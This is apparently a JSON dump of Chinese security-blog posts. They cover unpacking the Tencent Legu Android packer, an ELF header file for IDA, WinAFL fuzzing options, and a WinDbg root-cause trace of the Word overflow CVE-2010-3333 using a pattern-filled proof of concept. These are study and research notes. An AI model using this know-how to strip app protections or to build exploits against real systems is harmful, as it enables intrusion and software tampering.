= (*a1)-&gt;FindClass(a1, \"com/tencent/StubShell/TxAppEntry\"); if ( v7 ) &#123; v8 = (*v5)-&gt;RegisterNatives(v5, v7, v6, 5); v7 = (jclass)1; if ( v8 &lt; 0 ) &#123; _android_log_print(3, (int)\"SecShell\", \"register nativers error\"); v7 = 0; &#125; &#125; 0x4 load的本地函数12345678910111213141516171819int __fastcall com_tencent_StubShell_TxAppEntr_load(JNIEnv *a1, int a2, int context)&#123; v3 = a1; v4 = context; v5 = hook_art_aoc(); v6 = j_j_j_getpid_0(v5); _android_log_print(3, (int)\"SecShell\", \"Start load %d\", v6); result = get_sdk_version(v3); if ( result ) &#123; v8 = is_art((int)v3); sub_EF0C53E4(v3); // 设置com/tencent/StubShell/TxReceiver的TX_RECIEVER字段 if ( v8 ) result = art_load(v3, v4, 0, 0); else result = dalvik_load(v3, v4, 0); &#125; return result;&#125; 在load的本地函数中，根据当前虚拟机实现来加载Dex. 0x5 Art加载加载的思路简单的概括如下： 1. 通过mCookie得到ShellDex的地址 2. 通过ShellDex的 data_size + data_off 得到原Dex的偏移（偏移相对于ShellDex的地址），并得到原Dex内存地址 3. 解密（TEA）原Dex后，在偏移0x20处得到整个原Dex大小 4. Hook mmap函数, 当加载ShellDex时，替换成原Dex解密后的内容 5. Hook fstat函数, 当加载ShellDex时，替换成原Dex的信息（重点是替换文件大小） 6. 调用DexFile.load函数，加载ShellDex 7. 如果有多个Dex，重复上面 2 - 6 步骤 8. 构造一个新的Elements数组，替换当前ClassLoader.pathList.dexElements 0x6 Dalvik加载加载的思路简单的概括如下： 1. 获取mCookie 1) 对于sdk大于10，通过ClassLoader.PathList.dexElements.dexFile获取mCookie 2) 对于sdk小于10，通过ClassLoader.mDexs获取mCookie 2. 通过mCookie获取ShellDex的地址 3. 通过ShellDex的 data_size + data_off 得到原Dex的偏移（偏移相对于ShellDex的地址），并得到原Dex内存地址 4. 使用TEA解密原Dex 5. 加载mix.dex 6. 构造DexFile和DvmDex的实例，各个字段指向原Dex的信息 7. 用新的DexFile和DvmDex实例，替换mix.dex的mCookie的相应字段 8. 如果有多个Dex，根据当前原Dex的 data_size + data_off 获取下一个原Dex的偏移，然后重复上面 4 - 7 步骤 9. 将加载的Dex加入当前类加载器 1) 对于sdk大于10，构造一个新的Elements数组，替换当前ClassLoader.pathList.dexElements 2) 对于sdk小于10，分别构造mDexs、mPaths、mFiles、mZips，替换当前ClassLoader的相应字段 0x7 附件init_array解密.idbFake_Jni_Onload解密.idb 0x8 参考[1] 乐固libshella 2.10.1分析笔记","tags":[{"name":"Android加固","slug":"Android加固","permalink":"http://www.ench4nt3r.com/tags/Android加固/"}]},{"title":"elf.h in IDA","date":"2017-07-09T06:51:15.000Z","path":"2017/07/09/elf-in-ida/","text":"可以直接在IDA导入的elf头文件 elf.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439/**************************************************************************** **************************************************************************** *** *** This header was automatically generated from a Linux kernel header *** of the same name, to make information necessary for userspace to *** call into the kernel available to libc. It contains only constants, *** structures, and macros generated from the original header, and thus, *** contains no copyrightable information. *** *** To edit the content of this header, modify the corresponding *** source file (e.g. under external/kernel-headers/original/) then *** run bionic/libc/kernel/tools/update_all.py *** *** Any manual change here will be lost the next time this script will *** be run. You've been warned! *** **************************************************************************** ****************************************************************************/#ifndef _UAPI_LINUX_ELF_H#define _UAPI_LINUX_ELF_H// #include &lt;linux/types.h&gt;// #include &lt;linux/elf-em.h&gt;#define __signed__ signed typedef unsigned long __u64;typedef unsigned int __u32;typedef unsigned short __u16;typedef unsigned long __u64;typedef __signed__ long __u64;typedef __signed__ int __s32;typedef __signed__ short __s16; /* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */typedef __u32 Elf32_Addr;typedef __u16 Elf32_Half;typedef __u32 Elf32_Off;typedef __s32 Elf32_Sword;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */typedef __u32 Elf32_Word;typedef __u64 Elf64_Addr;typedef __u16 Elf64_Half;typedef __s16 Elf64_SHalf;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */typedef __u64 Elf64_Off;typedef __s32 Elf64_Sword;typedef __u32 Elf64_Word;typedef __u64 Elf64_Xword;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */typedef __s64 Elf64_Sxword;#define PT_NULL 0#define PT_LOAD 1#define PT_DYNAMIC 2/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define PT_INTERP 3#define PT_NOTE 4#define PT_SHLIB 5#define PT_PHDR 6/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define PT_TLS 7#define PT_LOOS 0x60000000#define PT_HIOS 0x6fffffff#define PT_LOPROC 0x70000000/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define PT_HIPROC 0x7fffffff#define PT_GNU_EH_FRAME 0x6474e550#define PT_GNU_STACK (PT_LOOS + 0x474e551)#define PN_XNUM 0xffff/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define ET_NONE 0#define ET_REL 1#define ET_EXEC 2#define ET_DYN 3/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define ET_CORE 4#define ET_LOPROC 0xff00#define ET_HIPROC 0xffff#define DT_NULL 0/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define DT_NEEDED 1#define DT_PLTRELSZ 2#define DT_PLTGOT 3#define DT_HASH 4/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define DT_STRTAB 5#define DT_SYMTAB 6#define DT_RELA 7#define DT_RELASZ 8/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define DT_RELAENT 9#define DT_STRSZ 10#define DT_SYMENT 11#define DT_INIT 12/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define DT_FINI 13#define DT_SONAME 14#define DT_RPATH 15#define DT_SYMBOLIC 16/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define DT_REL 17#define DT_RELSZ 18#define DT_RELENT 19#define DT_PLTREL 20/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define DT_DEBUG 21#define DT_TEXTREL 22#define DT_JMPREL 23#define DT_ENCODING 32/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define OLD_DT_LOOS 0x60000000#define DT_LOOS 0x6000000d#define DT_HIOS 0x6ffff000#define DT_VALRNGLO 0x6ffffd00/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define DT_VALRNGHI 0x6ffffdff#define DT_ADDRRNGLO 0x6ffffe00#define DT_ADDRRNGHI 0x6ffffeff#define DT_VERSYM 0x6ffffff0/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define DT_RELACOUNT 0x6ffffff9#define DT_RELCOUNT 0x6ffffffa#define DT_FLAGS_1 0x6ffffffb#define DT_VERDEF 0x6ffffffc/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define DT_VERDEFNUM 0x6ffffffd#define DT_VERNEED 0x6ffffffe#define DT_VERNEEDNUM 0x6fffffff#define OLD_DT_HIOS 0x6fffffff/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define DT_LOPROC 0x70000000#define DT_HIPROC 0x7fffffff#define STB_LOCAL 0#define STB_GLOBAL 1/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define STB_WEAK 2#define STT_NOTYPE 0#define STT_OBJECT 1#define STT_FUNC 2/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define STT_SECTION 3#define STT_FILE 4#define STT_COMMON 5#define STT_TLS 6/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define ELF_ST_BIND(x) ((x) &gt;&gt; 4)#define ELF_ST_TYPE(x) (((unsigned int) x) &amp; 0xf)#define ELF32_ST_BIND(x) ELF_ST_BIND(x)#define ELF32_ST_TYPE(x) ELF_ST_TYPE(x)/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define ELF64_ST_BIND(x) ELF_ST_BIND(x)#define ELF64_ST_TYPE(x) ELF_ST_TYPE(x)typedef struct dynamic&#123; Elf32_Sword d_tag;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ union&#123; Elf32_Sword d_val; Elf32_Addr d_ptr; &#125; d_un;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */&#125; Elf32_Dyn;typedef struct &#123; Elf64_Sxword d_tag; union &#123;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Xword d_val; Elf64_Addr d_ptr; &#125; d_un;&#125; Elf64_Dyn;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define ELF32_R_SYM(x) ((x) &gt;&gt; 8)#define ELF32_R_TYPE(x) ((x) &amp; 0xff)#define ELF64_R_SYM(i) ((i) &gt;&gt; 32)#define ELF64_R_TYPE(i) ((i) &amp; 0xffffffff)/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */typedef struct elf32_rel &#123; Elf32_Addr r_offset; Elf32_Word r_info;&#125; Elf32_Rel;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */typedef struct elf64_rel &#123; Elf64_Addr r_offset; Elf64_Xword r_info;&#125; Elf64_Rel;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */typedef struct elf32_rela&#123; Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Sword r_addend;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */&#125; Elf32_Rela;typedef struct elf64_rela &#123; Elf64_Addr r_offset; Elf64_Xword r_info;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Sxword r_addend;&#125; Elf64_Rela;typedef struct elf32_sym&#123; Elf32_Word st_name;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; unsigned char st_other;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf32_Half st_shndx;&#125; Elf32_Sym;typedef struct elf64_sym &#123; Elf64_Word st_name;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ unsigned char st_info; unsigned char st_other; Elf64_Half st_shndx; Elf64_Addr st_value;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Xword st_size;&#125; Elf64_Sym;#define EI_NIDENT 16typedef struct elf32_hdr&#123;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf32_Addr e_entry; Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf32_Half e_shnum; Elf32_Half e_shstrndx;&#125; Elf32_Ehdr;typedef struct elf64_hdr &#123;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ unsigned char e_ident[EI_NIDENT]; Elf64_Half e_type; Elf64_Half e_machine; Elf64_Word e_version;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Addr e_entry; Elf64_Off e_phoff; Elf64_Off e_shoff; Elf64_Word e_flags;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Half e_ehsize; Elf64_Half e_phentsize; Elf64_Half e_phnum; Elf64_Half e_shentsize;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Half e_shnum; Elf64_Half e_shstrndx;&#125; Elf64_Ehdr;#define PF_R 0x4/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define PF_W 0x2#define PF_X 0x1typedef struct elf32_phdr&#123; Elf32_Word p_type;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf32_Off p_offset; Elf32_Addr p_vaddr; Elf32_Addr p_paddr; Elf32_Word p_filesz;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf32_Word p_memsz; Elf32_Word p_flags; Elf32_Word p_align;&#125; Elf32_Phdr;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */typedef struct elf64_phdr &#123; Elf64_Word p_type; Elf64_Word p_flags; Elf64_Off p_offset;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Addr p_vaddr; Elf64_Addr p_paddr; Elf64_Xword p_filesz; Elf64_Xword p_memsz;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Xword p_align;&#125; Elf64_Phdr;#define SHT_NULL 0#define SHT_PROGBITS 1/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define SHT_SYMTAB 2#define SHT_STRTAB 3#define SHT_RELA 4#define SHT_HASH 5/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define SHT_DYNAMIC 6#define SHT_NOTE 7#define SHT_NOBITS 8#define SHT_REL 9/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define SHT_SHLIB 10#define SHT_DYNSYM 11#define SHT_NUM 12#define SHT_LOPROC 0x70000000/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define SHT_HIPROC 0x7fffffff#define SHT_LOUSER 0x80000000#define SHT_HIUSER 0xffffffff#define SHF_WRITE 0x1/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define SHF_ALLOC 0x2#define SHF_EXECINSTR 0x4#define SHF_MASKPROC 0xf0000000#define SHN_UNDEF 0/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define SHN_LORESERVE 0xff00#define SHN_LOPROC 0xff00#define SHN_HIPROC 0xff1f#define SHN_ABS 0xfff1/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define SHN_COMMON 0xfff2#define SHN_HIRESERVE 0xfffftypedef struct elf32_shdr &#123; Elf32_Word sh_name;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf32_Word sh_type; Elf32_Word sh_flags; Elf32_Addr sh_addr; Elf32_Off sh_offset;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf32_Word sh_size; Elf32_Word sh_link; Elf32_Word sh_info; Elf32_Word sh_addralign;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf32_Word sh_entsize;&#125; Elf32_Shdr;typedef struct elf64_shdr &#123; Elf64_Word sh_name;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Word sh_type; Elf64_Xword sh_flags; Elf64_Addr sh_addr; Elf64_Off sh_offset;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Xword sh_size; Elf64_Word sh_link; Elf64_Word sh_info; Elf64_Xword sh_addralign;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Xword sh_entsize;&#125; Elf64_Shdr;#define EI_MAG0 0#define EI_MAG1 1/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define EI_MAG2 2#define EI_MAG3 3#define EI_CLASS 4#define EI_DATA 5/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define EI_VERSION 6#define EI_OSABI 7#define EI_PAD 8#define ELFMAG0 0x7f/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define ELFMAG1 'E'#define ELFMAG2 'L'#define ELFMAG3 'F'#define ELFMAG \"\\177ELF\"/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define SELFMAG 4#define ELFCLASSNONE 0#define ELFCLASS32 1#define ELFCLASS64 2/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define ELFCLASSNUM 3#define ELFDATANONE 0#define ELFDATA2LSB 1#define ELFDATA2MSB 2/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define EV_NONE 0#define EV_CURRENT 1#define EV_NUM 2#define ELFOSABI_NONE 0/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define ELFOSABI_LINUX 3#ifndef ELF_OSABI#define ELF_OSABI ELFOSABI_NONE#endif/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define NT_PRSTATUS 1#define NT_PRFPREG 2#define NT_PRPSINFO 3#define NT_TASKSTRUCT 4/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define NT_AUXV 6#define NT_SIGINFO 0x53494749#define NT_FILE 0x46494c45#define NT_PRXFPREG 0x46e62b7f/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define NT_PPC_VMX 0x100#define NT_PPC_SPE 0x101#define NT_PPC_VSX 0x102#define NT_386_TLS 0x200/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define NT_386_IOPERM 0x201#define NT_X86_XSTATE 0x202#define NT_S390_HIGH_GPRS 0x300#define NT_S390_TIMER 0x301/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define NT_S390_TODCMP 0x302#define NT_S390_TODPREG 0x303#define NT_S390_CTRS 0x304#define NT_S390_PREFIX 0x305/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define NT_S390_LAST_BREAK 0x306#define NT_S390_SYSTEM_CALL 0x307#define NT_S390_TDB 0x308#define NT_ARM_VFP 0x400/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define NT_ARM_TLS 0x401#define NT_ARM_HW_BREAK 0x402#define NT_ARM_HW_WATCH 0x403#define NT_METAG_CBUF 0x500/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#define NT_METAG_RPIPE 0x501#define NT_METAG_TLS 0x502typedef struct elf32_note &#123; Elf32_Word n_namesz;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf32_Word n_descsz; Elf32_Word n_type;&#125; Elf32_Nhdr;typedef struct elf64_note &#123;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */ Elf64_Word n_namesz; Elf64_Word n_descsz; Elf64_Word n_type;&#125; Elf64_Nhdr;/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */#endif","tags":[{"name":"IDA","slug":"IDA","permalink":"http://www.ench4nt3r.com/tags/IDA/"},{"name":"elf头文件","slug":"elf头文件","permalink":"http://www.ench4nt3r.com/tags/elf头文件/"}]},{"title":"浅谈Winafl","date":"2016-12-16T16:00:00.000Z","path":"2016/12/17/winafl-analysis/","text":"!! 这篇文章大部分内容丢失了，重要数据一定要备份！ Winafl的参数 covtype - 覆盖类型 覆盖类型分为bb(basic block)和edge两种类型，bb表示在记录被覆盖路径时只记录路径，而不像edge类型还记录从一个路径到另一个路径的转换。 比如以下的例子： #1: A -&gt; B -&gt; C -&gt; D -&gt; E #2: A -&gt; B -&gt; D -&gt; C -&gt; E 在bb类型中，只记录了程序走过这5个路径，而不记录走过的顺序，所以bb类型无法区分#1和#2有什么不同。而edge通过以下算法来记录路径的转换。 123cur_location = &lt;COMPILE_TIME_RANDOM&gt;;shared_mem[cur_location ^ prev_location]++; prev_location = cur_location &gt;&gt; 1; bb类型记录路径在winafl的实现： 123offset = cur_location - module_base_address;offset &amp;= MAP_SIZE - 1;shared_mem[offset]++; target_module &amp;&amp; (target_method || target_offset) - 目标函数 当使用target_module参数，则必须指定target_method或target_offset。 这些参数的作用是当被fuzz的程序执行到指定的目标函数时，winafl记录当前参数；而当执行完这个函数准备退出时，winafl会恢复PC指针、栈顶指针和先前记录的参数，从而使得程序回到目标函数迭代执行。 Winafl保存的参数数量根据winafl的nargs参数而定，默认是0。 迭代的次数根据fuzz_iterations参数，默认是1000。 Afl的参数 i - 样本目录 顾名思义，这个参数指向放着样本的目录。当参数值是 - 时，afl会恢复上次执行。","tags":[{"name":"Fuzz - Winafl","slug":"Fuzz-Winafl","permalink":"http://www.ench4nt3r.com/tags/Fuzz-Winafl/"}]},{"title":"漏洞战争笔记之Cve-2010-3333","date":"2016-11-19T16:00:00.000Z","path":"2016/11/20/漏洞战争笔记之Cve-2010-3333/","text":"实验环境： windows xp sp3 pro office 2007 诡异的运算书上有讲，打开poc后会断在rep movs dword ptr es:[edi], dword ptr [esi]，然而并没有。 将windbg附上winword.exe，打开poc，windbg停在了这里：12345678(5d4.60c): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=3c524228 ebx=00000000 ecx=0011fe34 edx=00000000 esi=0107c398 edi=0011fff0eip=32cf3814 esp=0011fde8 ebp=0011fde8 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206mso!Ordinal7356+0x1315:32cf3814 8b4804 mov ecx,dword ptr [eax+4] ds:0023:3c52422c=???????? 瞅瞅eax的值从哪来。123456789100:000&gt; ub @eipmso!Ordinal7356+0x12fd:32cf37fc 0000 add byte ptr [eax],al32cf37fe 3442 xor al,42h32cf3800 b301 mov bl,132cf3802 e97cffffff jmp mso!Ordinal7356+0x1284 (32cf3783)32cf3807 55 push ebp32cf3808 8bec mov ebp,esp32cf380a 8b450c mov eax,dword ptr [ebp+0Ch]32cf380d 8d04c52038cf32 lea eax,mso!Ordinal7356+0x1321 (32cf3820)[eax*8] 在32cf380a下个断点。12345670:006&gt; gBreakpoint 0 hiteax=0011fdfc ebx=00000000 ecx=0011fe34 edx=00000000 esi=0107c3b0 edi=0011fff0eip=32cf380a esp=0011fde8 ebp=0011fde8 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mso!Ordinal7356+0x130b:32cf380a 8b450c mov eax,dword ptr [ebp+0Ch] ss:0023:0011fdf4=41306141 用编辑器打开poc，搜索41613041，搜索命中，看来这个数据是从poc里拿过来的。现在来看看调用栈，看看它来自何方。123456780:000&gt; kb 5ChildEBP RetAddr Args to Child WARNING: Stack unwind information not available. Following frames may be wrong.0011fde8 32e5944d 0011fdfc 41306141 05000000 mso!Ordinal7356+0x130b0011fe04 32e595bf 41306141 41386141 0011fe34 mso!Ordinal2605+0x326e0011fe3c 37614136 41386141 62413961 31624130 mso!Ordinal2605+0x33e00011fe40 41386141 62413961 31624130 41326241 0x376141360011fe44 62413961 31624130 41326241 62413362 0x41386141 可以看见41306141最后出现的位置是在0011fe04 32e595bf 41306141 41386141 0011fe34 mso!Ordinal2605+0x326e。 看看32e595bf处的代码123456789101112131415161718192021220:000&gt; ub 32e595bf L14mso!Ordinal2605+0x33a9:32e59588 ff750c push dword ptr [ebp+0Ch]32e5958b 8b7064 mov esi,dword ptr [eax+64h]32e5958e 8365f800 and dword ptr [ebp-8],032e59592 8b06 mov eax,dword ptr [esi]32e59594 8d4df0 lea ecx,[ebp-10h]32e59597 51 push ecx32e59598 bb00000005 mov ebx,5000000h32e5959d 56 push esi32e5959e 895df4 mov dword ptr [ebp-0Ch],ebx32e595a1 ff501c call dword ptr [eax+1Ch]32e595a4 8b4514 mov eax,dword ptr [ebp+14h]32e595a7 ff7518 push dword ptr [ebp+18h]32e595aa f7d8 neg eax32e595ac 1bc0 sbb eax,eax32e595ae 8d4df8 lea ecx,[ebp-8]32e595b1 23c1 and eax,ecx32e595b3 50 push eax32e595b4 ff7508 push dword ptr [ebp+8]32e595b7 ff75f0 push dword ptr [ebp-10h]32e595ba e85cfeffff call mso!Ordinal2605+0x323c (32e5941b) 第一个参数来自[ebp-10h]，并且在上面的代码中，看起来似乎是在这里32e595a1 ff501c call dword ptr [eax+1Ch]填充了它，来确定一下是不是跟我们说的一样，在32e595a1下个断点。 调用之前：123456789101112131415Breakpoint 2 hiteax=32a0c8c4 ebx=05000000 ecx=0011fe2c edx=00000300 esi=0107c518 edi=0011fff0eip=32e595a1 esp=0011fe10 ebp=0011fe3c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mso!Ordinal2605+0x33c2:32e595a1 ff501c call dword ptr [eax+1Ch] ds:0023:32a0c8e0=327c002c0:000&gt; db ebp-100011fe2c 76 00 fe 00 00 00 00 05-00 00 00 00 fe 00 ff ff v...............0011fe3c 6c fe 11 00 f4 96 e5 32-a8 ff 11 00 00 00 00 00 l......2........0011fe4c ff ff ff ff 00 00 00 00-18 08 61 04 50 0d 12 00 ..........a.P...0011fe5c b4 04 12 00 10 01 12 00-ce de c9 47 00 00 00 00 ...........G....0011fe6c c8 00 12 00 bb 98 e5 32-f0 ff 11 00 a8 ff 11 00 .......2........0011fe7c 00 00 00 00 18 08 61 04-00 00 00 00 b4 04 12 00 ......a.........0011fe8c 10 01 12 00 00 00 00 00-ff ff ff ff ff ff ff ff ................0011fe9c ff ff ff ff 00 00 00 00-00 00 00 20 00 01 01 00 ........... .... 调用之后：1234567891011121314150:000&gt; peax=0011fe2c ebx=05000000 ecx=00000000 edx=00000000 esi=0107c518 edi=0011fff0eip=32e595a4 esp=0011fe1c ebp=0011fe3c iopl=0 nv up ei pl nz ac po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212mso!Ordinal2605+0x33c5:32e595a4 8b4514 mov eax,dword ptr [ebp+14h] ss:0023:0011fe50=413262410:000&gt; db ebp-100011fe2c 41 61 30 41 61 31 41 61-32 41 61 33 41 61 34 41 Aa0Aa1Aa2Aa3Aa4A0011fe3c 61 35 41 61 36 41 61 37-41 61 38 41 61 39 41 62 a5Aa6Aa7Aa8Aa9Ab0011fe4c 30 41 62 31 41 62 32 41-62 33 41 62 34 41 62 35 0Ab1Ab2Ab3Ab4Ab50011fe5c 41 62 36 41 62 37 41 62-38 41 62 39 41 63 30 41 Ab6Ab7Ab8Ab9Ac0A0011fe6c 63 31 41 63 32 41 63 33-41 63 34 41 63 35 41 63 c1Ac2Ac3Ac4Ac5Ac0011fe7c 36 41 63 37 41 63 38 41-63 39 41 64 30 41 64 31 6Ac7Ac8Ac9Ad0Ad10011fe8c 41 64 32 41 64 